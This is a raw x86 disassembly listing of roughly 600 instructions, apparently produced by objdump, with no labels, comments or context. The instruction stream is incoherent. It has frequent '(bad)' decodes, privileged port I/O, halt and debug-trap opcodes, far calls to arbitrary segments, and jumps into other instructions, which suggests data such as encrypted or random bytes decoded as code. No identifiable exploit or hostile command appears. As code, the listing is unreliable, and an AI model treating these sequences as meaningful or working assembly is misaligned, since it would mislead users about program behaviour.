  40b1a6:	bound  ecx,QWORD PTR [eax]
  40b1a8:	adc    edi,DWORD PTR [ecx-0x6eed843d]
  40b1ae:	inc    ebx
  40b1b0:	leave  
  40b1b1:	mov    al,0x63
  40b1b3:	inc    esi
  40b1b4:	mov    edx,0xc4fd6130
  40b1b9:	sbb    dh,BYTE PTR [edx]
  40b1bb:	xor    ebp,0x8e20fe21
  40b1c1:	retf   
  40b1c2:	js     0x40b1ad
  40b1c4:	add    ebp,DWORD PTR [ecx]
  40b1c6:	push   ecx
  40b1c7:	fs stos DWORD PTR es:[edi],eax
  40b1c9:	xchg   BYTE PTR [edx+ebx*8+0x780b75da],bh
  40b1d0:	out    dx,eax
  40b1d1:	mov    ch,0xeb
  40b1d3:	test   BYTE PTR [ebx-0x39],cl
  40b1d6:	call   0xbf86:0x1a58002e
  40b1dd:	call   0xef4999fe
  40b1e2:	push   ds
  40b1e3:	test   al,0x5c
  40b1e5:	cmc    
  40b1e6:	aas    
  40b1e7:	sbb    BYTE PTR [edi+0x65],0xc2
  40b1eb:	xor    al,0x1a
  40b1ed:	mov    edx,ss
  40b1ef:	cli    
  40b1f0:	xor    al,0xbf
  40b1f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1f4:	scas   eax,DWORD PTR es:[edi]
  40b1f5:	shr    eax,cl
  40b1f7:	mov    ecx,0x57f68682
  40b1fc:	rcr    DWORD PTR [edx+0x187d2935],cl
  40b202:	mov    esp,0xe8cea2
  40b207:	jae    0x40b234
  40b209:	jmp    0x40b271
  40b20b:	loope  0x40b24a
  40b20d:	or     eax,0xd97e86b5
  40b212:	icebp  
  40b213:	retf   
  40b214:	hlt    
  40b215:	and    eax,0x8a2b32d1
  40b21a:	out    0xbd,al
  40b21c:	dec    esp
  40b21d:	inc    edi
  40b21e:	retf   
  40b21f:	jp     0x40b228
  40b221:	(bad)  
  40b222:	cdq    
  40b223:	aam    0x4f
  40b225:	mov    ds:0x91418c9d,eax
  40b22a:	push   eax
  40b22b:	fs hlt 
  40b22d:	xor    BYTE PTR [edx-0x27e40b48],bl
  40b233:	call   0x94b2:0x494d59e7
  40b23a:	lods   eax,DWORD PTR ds:[esi]
  40b23b:	jns    0x40b271
  40b23d:	adc    al,0x62
  40b23f:	repz int 0xe1
  40b242:	dec    ecx
  40b243:	adc    eax,0xd7d0245a
  40b248:	mov    eax,ds:0xd408d73
  40b24d:	pop    eax
  40b24e:	bound  ebp,QWORD PTR [ebx-0x6a3535f8]
  40b254:	repz out dx,eax
  40b256:	add    ecx,ebp
  40b258:	or     al,0x89
  40b25a:	inc    edx
  40b25b:	lahf   
  40b25c:	adc    dl,ah
  40b25e:	xchg   BYTE PTR [edi-0x30],ah
  40b261:	(bad)  [ecx-0x60]
  40b264:	fimul  DWORD PTR ds:0x6f292c4a
  40b26a:	retf   0xce93
  40b26d:	push   ebx
  40b26e:	cmp    DWORD PTR [edx+esi*1-0x781f8dca],eax
  40b275:	lahf   
  40b276:	mov    ebp,0xa8084b1b
  40b27b:	or     al,0x1a
  40b27d:	push   es
  40b27e:	cmp    al,0x9a
  40b280:	in     eax,dx
  40b281:	in     al,dx
  40b282:	xchg   dh,dl
  40b284:	std    
  40b285:	rdtsc  
  40b287:	cmp    ebx,DWORD PTR [eax]
  40b289:	fimul  WORD PTR [ebx-0x7a]
  40b28c:	sbb    al,0xba
  40b28e:	aas    
  40b28f:	add    DWORD PTR [eax-0x234d6521],ebp
  40b295:	and    al,0x58
  40b297:	aaa    
  40b298:	jne    0x40b2b7
  40b29a:	inc    DWORD PTR [ecx-0x24]
  40b29d:	push   es
  40b29e:	ficom  DWORD PTR [edi+0x44e31728]
  40b2a4:	jbe    0x40b2bd
  40b2a6:	inc    esi
  40b2a7:	scas   eax,DWORD PTR es:[edi]
  40b2a8:	fsub   st,st(6)
  40b2aa:	div    dl
  40b2ac:	mov    bl,dh
  40b2ae:	test   BYTE PTR [ebp-0x4d812ac],ch
  40b2b4:	push   edx
  40b2b5:	repnz push 0x74
  40b2b8:	shl    DWORD PTR [ebx],1
  40b2ba:	mov    edi,0xaf4d963d
  40b2bf:	mov    ds:0xf7a4d22f,eax
  40b2c4:	mov    ebp,0xea5d2a81
  40b2c9:	push   DWORD PTR [ebp-0x611baa7e]
  40b2cf:	int3   
  40b2d0:	jg     0x40b300
  40b2d2:	inc    ebp
  40b2d3:	pop    ebx
  40b2d4:	inc    esi
  40b2d5:	sub    al,0x91
  40b2d7:	enter  0xbd78,0xa
  40b2db:	repnz sub al,0x9b
  40b2de:	std    
  40b2df:	mov    edi,0xe351946f
  40b2e4:	lods   eax,DWORD PTR ds:[esi]
  40b2e5:	(bad)  
  40b2e6:	test   al,0x6c
  40b2e8:	std    
  40b2e9:	mov    ch,BYTE PTR [esi]
  40b2eb:	lock or al,0x8f
  40b2ee:	sub    al,0x5b
  40b2f0:	mov    cl,0x76
  40b2f2:	(bad)  
  40b2f3:	jbe    0x40b335
  40b2f5:	(bad)  
  40b2f6:	inc    esp
  40b2f7:	jae    0x40b291
  40b2f9:	test   eax,0xc20a74cc
  40b2fe:	adc    edi,edx
  40b300:	adc    eax,0xffb81aec
  40b305:	retf   0x5862
  40b308:	aaa    
  40b309:	pop    es
  40b30a:	sar    DWORD PTR [eax-0x5213446c],1
  40b310:	sbb    DWORD PTR [ecx-0x596f1a73],eax
  40b316:	mov    bh,0xb
  40b318:	xor    DWORD PTR [edx],ebx
  40b31a:	fistp  WORD PTR [edx+0x65bf4810]
  40b320:	neg    al
  40b322:	push   0x55
  40b324:	call   0xe98e:0x8f8ad96a
  40b32b:	ret    0x5030
  40b32e:	fisubr DWORD PTR [ecx]
  40b330:	jmp    0x550d:0xd05ac94d
  40b337:	jo     0x40b381
  40b339:	mov    dl,0x1c
  40b33b:	mov    ds:0x3f23e068,al
  40b340:	mov    al,0x64
  40b342:	pop    ds
  40b343:	or     esp,ecx
  40b345:	mov    WORD PTR ds:0x634ae46f,ds
  40b34b:	test   al,0xb7
  40b34d:	cmp    DWORD PTR [ecx],ebx
  40b34f:	repnz or bl,cl
  40b352:	or     ebp,DWORD PTR [eax+0x50]
  40b355:	in     eax,0x39
  40b357:	jecxz  0x40b33a
  40b359:	jge    0x40b3d2
  40b35b:	push   ecx
  40b35c:	add    al,0x49
  40b35e:	retf   0xd435
  40b361:	lds    ebp,FWORD PTR [esi+0x4a]
  40b364:	or     dh,BYTE PTR [esi]
  40b366:	mov    cl,0x5a
  40b368:	mov    bh,0x79
  40b36a:	sti    
  40b36b:	adc    esi,DWORD PTR [edx+0xf]
  40b36e:	mov    ds:0xa83aee06,al
  40b373:	mov    al,ds:0xef6ae503
  40b378:	lods   eax,DWORD PTR ds:[esi]
  40b379:	iret   
  40b37a:	xor    ebp,ecx
  40b37c:	adc    ebp,DWORD PTR fs:[ecx+0x36]
  40b380:	cmp    al,0x1
  40b382:	inc    edx
  40b383:	loope  0x40b367
  40b385:	out    dx,al
  40b386:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b387:	mov    al,ds:0xdcf5132
  40b38c:	sub    eax,DWORD PTR [ecx+0x68]
  40b38f:	jae    0x40b336
  40b391:	icebp  
  40b392:	mov    ebp,0xb311bbb8
  40b397:	add    esp,DWORD PTR [ebx-0x4ae9d44]
  40b39d:	in     eax,0xf1
  40b39f:	mov    ah,0xda
  40b3a1:	cwde   
  40b3a2:	xor    DWORD PTR [ecx+ebx*2],0xffffffa4
  40b3a6:	mov    ecx,0x1a836916
  40b3ab:	pop    edx
  40b3ac:	into   
  40b3ad:	add    bh,bl
  40b3af:	sbb    bl,0x72
  40b3b2:	mov    al,0x30
  40b3b4:	dec    eax
  40b3b5:	ins    DWORD PTR es:[edi],dx
  40b3b6:	jle    0x40b36f
  40b3b8:	(bad)  
  40b3b9:	outs   dx,DWORD PTR ds:[esi]
  40b3ba:	in     al,0x8d
  40b3bc:	test   al,0x4f
  40b3be:	inc    ebp
  40b3bf:	sbb    BYTE PTR [ebx],0x7d
  40b3c2:	call   0x5132d08b
  40b3c7:	pop    edi
  40b3c8:	pop    ebp
  40b3c9:	retf   0x6c95
  40b3cc:	dec    ebp
  40b3cd:	and    DWORD PTR [ebx],0x2a
  40b3d0:	test   al,0xdc
  40b3d2:	dec    ebp
  40b3d3:	fwait
  40b3d4:	jae    0x40b3fa
  40b3d6:	dec    DWORD PTR [edx-0x47]
  40b3d9:	pop    ebp
  40b3da:	popa   
  40b3db:	fstp   TBYTE PTR [esi]
  40b3dd:	shr    BYTE PTR [esi-0x20a734f5],cl
  40b3e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3e4:	out    dx,al
  40b3e5:	(bad)  
  40b3e6:	cmc    
  40b3e7:	ins    DWORD PTR es:[edi],dx
  40b3e8:	push   0x6dba61cd
  40b3ed:	xchg   ecx,eax
  40b3ee:	jae    0x40b3e6
  40b3f0:	pop    edi
  40b3f1:	test   BYTE PTR [edx+0x1d6cd1e8],dl
  40b3f7:	push   eax
  40b3f8:	mov    ebp,0xa342a945
  40b3fd:	sub    al,0x39
  40b3ff:	jmp    0x40b3a8
  40b401:	jb     0x40b470
  40b403:	xchg   ecx,eax
  40b404:	shl    DWORD PTR [ebx+0x2a84f3fb],0x38
  40b40b:	and    al,0x68
  40b40d:	pusha  
  40b40e:	sub    dl,bh
  40b410:	pop    ss
  40b411:	cmp    DWORD PTR [ebp-0x56],0xffffff85
  40b415:	mov    esi,0x6e4744e6
  40b41a:	cvtpi2ps xmm0,QWORD PTR [eax+eax*4-0x76]
  40b41f:	fwait
  40b420:	popf   
  40b421:	push   es
  40b422:	mov    dh,dl
  40b424:	es cmp al,0x9d
  40b427:	les    eax,FWORD PTR [ecx+0x5f7389fa]
  40b42d:	mov    al,BYTE PTR [ecx]
  40b42f:	test   eax,0x24ae191c
  40b434:	push   edx
  40b435:	iret   
  40b436:	mov    dl,0x5d
  40b438:	ins    BYTE PTR es:[edi],dx
  40b439:	fbstp  TBYTE PTR [ebp-0x2e]
  40b43c:	and    al,0xbe
  40b43e:	and    ecx,edi
  40b440:	jl     0x40b468
  40b442:	mov    edi,0x7f80fd91
  40b447:	fdiv   QWORD PTR [edx]
  40b449:	jmp    0x6f6e40c1
  40b44e:	(bad)  
  40b44f:	dec    esi
  40b450:	pop    ebp
  40b451:	outs   dx,BYTE PTR ds:[esi]
  40b452:	aam    0x21
  40b454:	dec    eax
  40b455:	mov    ch,0x17
  40b457:	js     0x40b465
  40b459:	mov    ds:0x98423116,al
  40b45e:	outs   dx,DWORD PTR ds:[esi]
  40b45f:	dec    DWORD PTR [edi+0x7c]
  40b462:	pop    ebp
  40b463:	out    0x95,eax
  40b465:	mov    edx,0x393f6bbe
  40b46a:	cli    
  40b46b:	push   es
  40b46c:	fimul  DWORD PTR [eax-0x38]
  40b46f:	pop    eax
  40b470:	mov    al,0xdb
  40b472:	dec    esp
  40b473:	pop    esi
  40b474:	scas   al,BYTE PTR es:[edi]
  40b475:	mov    cl,0x97
  40b477:	int    0xba
  40b479:	dec    edx
  40b47a:	int3   
  40b47b:	cs pop es
  40b47d:	xchg   ch,ah
  40b47f:	int    0x6d
  40b481:	imul   ecx,DWORD PTR fs:[edi+ebx*1+0x15],0x8f71e9e0
  40b48a:	jg     0x40b43e
  40b48c:	and    ecx,DWORD PTR [ecx+0x1f5b21ec]
  40b492:	adc    bh,0xc7
  40b495:	sar    esi,0x71
  40b498:	jmp    0x64f3917e
  40b49d:	repnz loopne 0x40b48b
  40b4a0:	sbb    al,0xc9
  40b4a2:	je     0x40b4ef
  40b4a4:	sub    edi,esi
  40b4a6:	enter  0x2ea2,0xc7
  40b4aa:	push   ebp
  40b4ab:	mov    bl,BYTE PTR [eax-0x52]
  40b4ae:	pop    ebx
  40b4af:	mov    eax,ds:0x554f2f14
  40b4b4:	xchg   ebp,eax
  40b4b5:	in     al,0x33
  40b4b7:	dec    BYTE PTR [esi-0x50]
  40b4ba:	dec    edi
  40b4bb:	or     DWORD PTR [edx+0x5d],esi
  40b4be:	rcr    DWORD PTR [edi+0x795a3efb],1
  40b4c4:	stc    
  40b4c5:	jecxz  0x40b527
  40b4c7:	mov    ds:0x97ef05cd,al
  40b4cc:	inc    esp
  40b4cd:	xchg   ebp,eax
  40b4ce:	sahf   
  40b4cf:	test   BYTE PTR [ebx+0x56fb282f],0x57
  40b4d6:	adc    DWORD PTR [esi+0x21],edi
  40b4d9:	(bad)  
  40b4da:	cli    
  40b4db:	sbb    BYTE PTR [edx+0x2c],bl
  40b4de:	jp     0x40b4e7
  40b4e0:	or     DWORD PTR [esi+0x4bdb88f1],ebp
  40b4e6:	jge    0x40b4d2
  40b4e8:	sbb    DWORD PTR [ebx+0x12],0x62983fee
  40b4ef:	push   eax
  40b4f0:	in     al,0xed
  40b4f2:	sahf   
  40b4f3:	jnp    0x40b4da
  40b4f5:	stc    
  40b4f6:	inc    edi
  40b4f7:	mov    al,ds:0x3bc48099
  40b4fc:	in     al,0x2e
  40b4fe:	jecxz  0x40b560
  40b500:	push   ecx
  40b501:	xchg   edx,eax
  40b502:	or     edx,esp
  40b504:	scas   eax,DWORD PTR es:[edi]
  40b505:	add    bh,al
  40b507:	mov    dh,0xea
  40b509:	pusha  
  40b50a:	into   
  40b50b:	pop    esp
  40b50c:	mov    ds:0xab3d5ca9,al
  40b511:	cmp    ecx,DWORD PTR [ebx-0x78]
  40b514:	mov    fs,WORD PTR [edx-0xd]
  40b517:	aaa    
  40b518:	hlt    
  40b519:	and    BYTE PTR [ebx],al
  40b51b:	mul    bh
  40b51d:	adc    al,0x26
  40b51f:	jp     0x40b568
  40b521:	arpl   sp,sp
  40b523:	daa    
  40b524:	mov    ah,0xb6
  40b526:	push   0x7aa7575c
  40b52b:	adc    dh,bh
  40b52d:	out    0xde,al
  40b52f:	test   dl,dl
  40b531:	popa   
  40b532:	fcomp  st(2)
  40b534:	pushf  
  40b535:	mov    dl,0xfc
  40b537:	out    dx,eax
  40b538:	in     al,dx
  40b539:	dec    ebp
  40b53a:	mov    ebp,0x3a68b24b
  40b53f:	or     al,0x34
  40b541:	std    
  40b542:	xchg   edi,eax
  40b543:	pop    ss
  40b544:	out    dx,eax
  40b545:	mov    ebp,0x797f38f4
  40b54a:	std    
  40b54b:	xchg   ecx,eax
  40b54c:	lods   eax,DWORD PTR ds:[esi]
  40b54d:	icebp  
  40b54e:	pop    es
  40b54f:	pop    ebp
  40b550:	push   ss
  40b551:	push   ecx
  40b552:	test   BYTE PTR [ebp+esi*2+0x2154e3fd],al
  40b559:	in     eax,dx
  40b55a:	sbb    DWORD PTR [edx],0xffffffb0
  40b55d:	fwait
  40b55e:	mov    fs,WORD PTR [edx-0x42]
  40b561:	cdq    
  40b562:	pop    ecx
  40b563:	jo     0x40b4ee
  40b565:	loop   0x40b53d
  40b567:	out    0xb4,al
  40b569:	iret   
  40b56a:	in     eax,dx
  40b56b:	fsubr  DWORD PTR [esi+ebp*2+0x4b2cd6be]
  40b572:	test   BYTE PTR [edx],al
  40b574:	ins    DWORD PTR es:[edi],dx
  40b575:	or     al,0xed
  40b577:	jae    0x40b5c3
  40b579:	push   ebp
  40b57a:	(bad)
  40b57e:	leave  
  40b57f:	jge    0x40b5f7
  40b581:	ja     0x40b5c2
  40b583:	mov    dh,0xe2
  40b585:	fmul   DWORD PTR [esi]
  40b587:	faddp  st(6),st
  40b589:	add    ebx,DWORD PTR [ebx+0x426423ee]
  40b58f:	mov    ebx,esp
  40b591:	or     BYTE PTR [esi+0x6ad2fbf8],0xb9
  40b598:	pop    eax
  40b599:	fwait
  40b59a:	add    al,0xd8
  40b59c:	mov    ds:0xd59fdd83,al
  40b5a1:	ins    BYTE PTR es:[edi],dx
  40b5a2:	fmul   DWORD PTR [edx-0x1b]
  40b5a5:	je     0x40b595
  40b5a7:	outs   dx,BYTE PTR ds:[esi]
  40b5a8:	int    0xcb
  40b5aa:	and    ecx,DWORD PTR [ecx]
  40b5ac:	daa    
  40b5ad:	mov    ds:0x350df210,eax
  40b5b2:	aad    0xbf
  40b5b4:	into   
  40b5b5:	push   ebx
  40b5b6:	xor    esi,DWORD PTR [ebx+0x293e705a]
  40b5bc:	loope  0x40b59a
  40b5be:	(bad)  
  40b5c0:	push   edx
  40b5c1:	cmp    bh,cl
  40b5c3:	add    BYTE PTR cs:[edx],bl
  40b5c6:	mov    al,0x74
  40b5c8:	test   eax,0xf3382806
  40b5cd:	ror    dl,0x1e
  40b5d0:	(bad)  
  40b5d1:	sub    al,0xaf
  40b5d3:	imul   ebp,DWORD PTR [edi-0x5d],0x73
  40b5d7:	and    BYTE PTR [edx],al
  40b5d9:	push   es
  40b5da:	outs   dx,DWORD PTR ds:[esi]
  40b5db:	cmp    eax,0x69c78077
  40b5e0:	adc    eax,edi
  40b5e2:	mov    esi,DWORD PTR [eax]
  40b5e4:	add    al,0x8e
  40b5e6:	sar    BYTE PTR [edi+0x1321724f],cl
  40b5ec:	imul   esi,DWORD PTR [eax],0xfffffff4
  40b5ef:	test   BYTE PTR [eax],0x86
  40b5f2:	dec    edx
  40b5f3:	(bad)  
  40b5f4:	sti    
  40b5f5:	jle    0x40b5ce
  40b5f7:	inc    ecx
  40b5f8:	cli    
  40b5f9:	pop    esi
  40b5fa:	dec    edi
  40b5fb:	jae    0x40b638
  40b5fd:	or     ebp,DWORD PTR [esi-0x6bf7d021]
  40b603:	mov    bl,0x12
  40b605:	outs   dx,BYTE PTR ds:[esi]
  40b606:	(bad)  
  40b607:	daa    
  40b608:	out    dx,al
  40b609:	cmp    esp,DWORD PTR [ebx]
  40b60b:	call   0x88b4373c
  40b610:	inc    edi
  40b611:	sbb    esi,DWORD PTR [edx]
  40b613:	repz mov ebp,0xebc4c89d
  40b619:	adc    edx,eax
  40b61b:	retf   0xc9dc
  40b61e:	outs   dx,BYTE PTR ds:[esi]
  40b61f:	imul   esp,DWORD PTR [ebp+0x316edec0],0xb316481f
  40b629:	xor    al,BYTE PTR [esi]
  40b62b:	inc    eax
  40b62c:	add    edx,DWORD PTR [edx-0x63e4fad4]
  40b632:	ss adc eax,0x5f339a3e
  40b638:	adc    eax,0xf40056e5
  40b63d:	jno    0x40b611
  40b63f:	push   cs
  40b640:	iret   
  40b641:	dec    edx
  40b642:	test   eax,0x5ce6733b
  40b647:	in     eax,0x99
  40b649:	xchg   ebp,eax
  40b64a:	xor    al,0x70
  40b64c:	push   edi
  40b64d:	inc    eax
  40b64e:	das    
  40b64f:	sub    DWORD PTR [esi+edx*4+0xa],eax
  40b653:	xor    dh,BYTE PTR [esi+0x8]
  40b656:	mov    al,ds:0x90712591
  40b65b:	inc    esi
  40b65c:	push   eax
  40b65d:	lock pop edx
  40b65f:	xlat   BYTE PTR ds:[ebx]
  40b660:	xor    dh,BYTE PTR [ebx+0x20]
  40b663:	cwde   
  40b664:	inc    edi
  40b665:	scas   eax,DWORD PTR es:[edi]
  40b666:	inc    ecx
  40b667:	and    ch,BYTE PTR [ecx+0x38c1e02f]
  40b66d:	ret    
  40b66e:	adc    esi,DWORD PTR [ebx]
  40b670:	jbe    0x40b5f8
  40b672:	fadd   QWORD PTR [esi+ebp*8-0x661f197d]
  40b679:	sub    eax,0xdd32ed2e
  40b67e:	or     BYTE PTR ds:0x5521268a,dh
  40b684:	scas   eax,DWORD PTR es:[edi]
  40b685:	cdq    
  40b686:	imul   eax,edi,0xffffffff
  40b689:	xchg   ebx,eax
  40b68a:	mov    ecx,DWORD PTR [eax+0x638db438]
  40b690:	and    eax,0xe8af80
  40b695:	sub    cl,al
  40b697:	pop    esp
  40b698:	mov    dh,0x4f
  40b69a:	daa    
  40b69b:	stos   BYTE PTR es:[edi],al
  40b69c:	addr16 in eax,0x2c
  40b69f:	sbb    ch,BYTE PTR [ebp-0xd4cd876]
  40b6a5:	xchg   DWORD PTR [esi+0x3d7cf7f5],edi
  40b6ab:	cld    
  40b6ac:	cmp    al,0xe6
  40b6ae:	mov    ebx,0x79de25ca
  40b6b3:	(bad)  
  40b6b5:	xor    dh,ch
  40b6b7:	retf   
  40b6b8:	xchg   esp,eax
  40b6b9:	int    0x6b
  40b6bb:	mov    gs,eax
  40b6bd:	inc    ecx
  40b6be:	pusha  
  40b6bf:	and    ah,BYTE PTR [ebx-0x6a]
  40b6c2:	daa    
  40b6c3:	push   cs
  40b6c4:	lods   al,BYTE PTR ds:[esi]
  40b6c5:	shr    esp,0x40
  40b6c8:	inc    edi
  40b6c9:	adc    BYTE PTR [edx+0xc],0x33
  40b6cd:	ss stos DWORD PTR es:[edi],eax
  40b6cf:	int3   
  40b6d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6d1:	jno    0x40b69d
  40b6d3:	iret   
  40b6d4:	xor    al,0x27
  40b6d6:	cmc    
  40b6d7:	xchg   esp,eax
  40b6d8:	js     0x40b73f
  40b6da:	mov    bl,0x6e
  40b6dc:	or     bl,bh
  40b6de:	mov    ebp,?
  40b6e0:	es jge 0x40b721
  40b6e3:	adc    bh,BYTE PTR [esi+0x38]
  40b6e6:	popa   
  40b6e7:	mov    ch,0x6f
  40b6e9:	stos   BYTE PTR es:[edi],al
  40b6ea:	mov    fs:0x86535d55,eax
  40b6f0:	sbb    al,0x39
  40b6f2:	in     eax,0x56
  40b6f4:	pop    ebp
  40b6f5:	cmp    bh,BYTE PTR [edx-0x60]
  40b6f8:	xchg   ebp,eax
  40b6f9:	mov    esp,0xdb75231a
  40b6fe:	imul   esp,ebx,0xffffffbb
  40b701:	sar    BYTE PTR [ebp+edx*8+0x2d],1
  40b705:	dec    esp
  40b706:	std    
  40b707:	xchg   ecx,eax
  40b708:	add    al,0x3e
  40b70a:	popf   
  40b70b:	lods   eax,DWORD PTR ds:[esi]
  40b70c:	fcomi  st,st(1)
  40b70e:	outs   dx,BYTE PTR ds:[esi]
  40b70f:	push   edi
  40b710:	mov    ecx,0x9661c14d
  40b715:	jnp    0x40b744
  40b717:	push   ebx
  40b718:	out    0xc3,al
  40b71a:	or     ch,BYTE PTR [esi-0x6eb680b9]
  40b720:	xchg   esp,eax
  40b721:	jmp    0x2f7c:0xc610f5ea
  40b728:	out    dx,al
  40b729:	cmp    al,0xe7
  40b72b:	push   cs
  40b72c:	push   esp
  40b72d:	retf   
  40b72e:	or     eax,0x3c65a450
  40b733:	aaa    
  40b734:	adc    al,0x3
  40b736:	out    dx,al
  40b737:	lea    ebx,[eax+edi*4+0x3b]
  40b73b:	xor    al,0xff
  40b73d:	mov    dh,0x6e
  40b73f:	adc    al,0x25
  40b741:	stc    
  40b742:	push   edx
  40b743:	push   es
  40b744:	and    dh,BYTE PTR [ebp-0x7a]
  40b747:	pop    esp
  40b748:	dec    esp
  40b749:	jb     0x40b779
  40b74b:	test   BYTE PTR [edi+0x37492026],dl
  40b751:	sti    
  40b752:	scas   eax,DWORD PTR es:[edi]
  40b753:	mov    edx,0x3b08b877
  40b758:	push   esi
  40b759:	cs sbb eax,0x35de79ff
  40b75f:	jae    0x40b7bc
  40b761:	cwde   
  40b762:	setns  BYTE PTR [eax-0x2ba331e3]
  40b769:	mov    ecx,0x68ac6341
  40b76e:	js     0x40b7b3
  40b770:	xor    al,0x3c
  40b772:	mov    al,0x2f
  40b774:	mov    ch,0xce
  40b776:	stos   BYTE PTR es:[edi],al
  40b777:	push   esp
  40b778:	fnsave ds:0xe2e8d9ab
  40b77e:	adc    eax,0x37c8da8e
  40b783:	cmp    esp,ebx
  40b785:	data16 xlat BYTE PTR ds:[ebx]
  40b787:	cdq    
  40b788:	sbb    esp,DWORD PTR [edi-0x75]
  40b78b:	fld    DWORD PTR [ecx+0x1fe0b8f0]
  40b791:	push   edx
  40b792:	(bad)
  40b795:	sbb    cl,BYTE PTR [eax-0x50]
  40b798:	dec    ebx
  40b799:	or     eax,DWORD PTR [edi*4-0x45ad57c2]
  40b7a0:	out    0x65,al
  40b7a2:	sub    DWORD PTR [ecx+0x67176340],0x78
  40b7a9:	mov    ecx,0xb7b07de6
  40b7ae:	das    
  40b7af:	dec    ebp
  40b7b0:	popa   
  40b7b1:	cli    
  40b7b2:	xor    dh,ch
  40b7b4:	mov    esi,DWORD PTR [edx+0x378581b3]
  40b7ba:	push   0x55
  40b7bc:	xchg   edi,eax
  40b7bd:	sbb    al,0x13
  40b7bf:	push   ebp
  40b7c0:	test   BYTE PTR [edi+0x6f],dl
  40b7c3:	punpckhdq mm1,QWORD PTR [ebp+0x31]
  40b7c7:	stc    
  40b7c8:	mov    cl,0xf4
  40b7ca:	jmp    FWORD PTR [ecx+0x4a53fda0]
  40b7d0:	cwde   
  40b7d1:	mov    esi,0x6aeb519
  40b7d6:	mov    eax,ds:0x229ef1cf
  40b7db:	mov    dh,0x84
  40b7dd:	pusha  
  40b7de:	in     eax,dx
  40b7df:	aas    
  40b7e0:	dec    edx
  40b7e1:	mov    eax,0xaaa22c4c
  40b7e6:	push   0x4c
  40b7e8:	inc    ecx
  40b7e9:	repnz std 
  40b7eb:	scas   al,BYTE PTR es:[edi]
  40b7ec:	jb     0x40b859
  40b7ee:	mov    dl,0x54
  40b7f0:	mov    bl,0x48
  40b7f2:	test   eax,0x24fabc8e
  40b7f7:	mov    ds:0x5aaa0ceb,eax
  40b7fc:	dec    esi
  40b7fd:	int3   
  40b7fe:	add    bh,BYTE PTR [ebx+0x13b74b6e]
  40b804:	and    ebx,0xfffffffd
  40b807:	fstp   TBYTE PTR [eax+0x18]
  40b80a:	sbb    eax,0x5316bb72
  40b80f:	jle    0x40b7cb
  40b811:	call   0x8d235363
  40b816:	xchg   ebp,ebp
  40b818:	dec    esp
  40b819:	je     0x40b890
  40b81b:	inc    BYTE PTR [ebx-0x4f]
  40b81e:	mov    bh,0xe6
  40b820:	sub    al,0xc3
  40b822:	in     eax,0x3a
  40b824:	or     ecx,DWORD PTR [ebx]
  40b826:	cmc    
  40b827:	call   0x186e:0x485f78eb
  40b82e:	imul   eax,DWORD PTR [edi+edx*8+0x46b806de],0x8abef1b6
  40b839:	out    dx,al
  40b83a:	mov    ecx,0x53afa01a
  40b83f:	sbb    DWORD PTR [esi-0x3d72fbfa],ecx
  40b845:	in     eax,0x47
  40b847:	loopne 0x40b8b9
  40b849:	adc    ebp,esi
  40b84b:	mov    eax,0x3682f21a
  40b850:	loop   0x40b7d3
  40b852:	jbe    0x40b823
  40b854:	jno    0x40b7ff
  40b856:	mov    ds:0xb8e7ba5e,eax
  40b85b:	or     WORD PTR [esi+0x2f],sp
  40b85f:	ret    
  40b860:	add    BYTE PTR [edx+eiz*2],0x59
  40b864:	sbb    ebp,ebx
  40b866:	mov    edi,0x259e713a
  40b86c:	pop    ebx
  40b86e:	inc    ebp
  40b86f:	ja     0x40b887
  40b871:	jmp    0x40b871
  40b873:	sbb    ecx,DWORD PTR [ecx+0x675e3f7f]
  40b879:	aas    
  40b87a:	das    
  40b87b:	lock push es
  40b87d:	scas   al,BYTE PTR es:[edi]
  40b87e:	in     eax,dx
  40b87f:	adc    DWORD PTR [ecx+0x1],0x7455d64d
  40b886:	sahf   
  40b887:	xchg   ebp,eax
  40b888:	iret   
  40b889:	es jle 0x40b8e2
  40b88c:	mov    edi,0xf669ba8
  40b891:	sbb    eax,0xc29a88e3
  40b896:	int3   
  40b897:	push   ecx
  40b898:	jo     0x40b8b4
  40b89a:	mov    esi,0x815bf90f
  40b89f:	sbb    ebx,DWORD PTR [edi-0x5e]
  40b8a2:	sar    BYTE PTR [edx+ebx*1-0x14],cl
  40b8a6:	std    
  40b8a7:	or     BYTE PTR [ebp-0x3fa137f8],bh
  40b8ad:	idiv   BYTE PTR [esi-0x3f]
  40b8b0:	ins    DWORD PTR es:[edi],dx
  40b8b1:	mov    dl,0x8
  40b8b3:	sub    BYTE PTR [edx-0x6],cl
  40b8b6:	pop    esp
  40b8b7:	out    dx,eax
  40b8b8:	sub    DWORD PTR [ebp+0x2b2b4497],edi
  40b8be:	push   es
  40b8bf:	mov    WORD PTR [esi+0x71],cs
  40b8c2:	ins    BYTE PTR es:[edi],dx
  40b8c3:	pop    esp
  40b8c4:	cmc    
  40b8c5:	jno    0x40b86d
  40b8c7:	add    al,0xa4
  40b8c9:	cmp    al,BYTE PTR [edi]
  40b8cb:	ins    DWORD PTR es:[edi],dx
  40b8cc:	repnz push edx
  40b8ce:	jno    0x40b94c
  40b8d0:	imul   ebx,DWORD PTR [esi],0xc3211708
  40b8d6:	cli    
  40b8d7:	pop    ecx
  40b8d8:	retf   
  40b8d9:	call   0xaaefa6d7
  40b8de:	mov    ds:0x2ae4d2d7,eax
  40b8e3:	inc    esp
  40b8e4:	arpl   WORD PTR [edx-0x7f121f5d],di
  40b8ea:	lahf   
  40b8eb:	mov    edx,0x882dda5e
  40b8f0:	neg    DWORD PTR [ecx]
  40b8f2:	mov    dl,0xea
  40b8f4:	lock and DWORD PTR [eax+ebp*4-0x7],ebx
  40b8f9:	cdq    
  40b8fa:	test   BYTE PTR [edx+0x41e9863a],ch
  40b900:	gs mov al,0xc7
  40b903:	xchg   esi,eax
  40b904:	pop    ecx
  40b905:	sbb    BYTE PTR ds:0x16e983a0,0x87
  40b90c:	sub    eax,0xa79512bf
  40b911:	push   ss
  40b912:	cmp    DWORD PTR [ebx-0x4e],edi
  40b915:	adc    edx,ecx
  40b917:	outs   dx,BYTE PTR ds:[esi]
  40b918:	mov    al,ds:0xfacf5eb
  40b91d:	or     dh,BYTE PTR [edi+0x3b8cc9fd]
  40b923:	xchg   esp,eax
  40b924:	out    0x2e,al
  40b926:	loope  0x40b996
  40b928:	(bad)  [ecx]
  40b92a:	xor    al,0xbb
  40b92c:	out    dx,eax
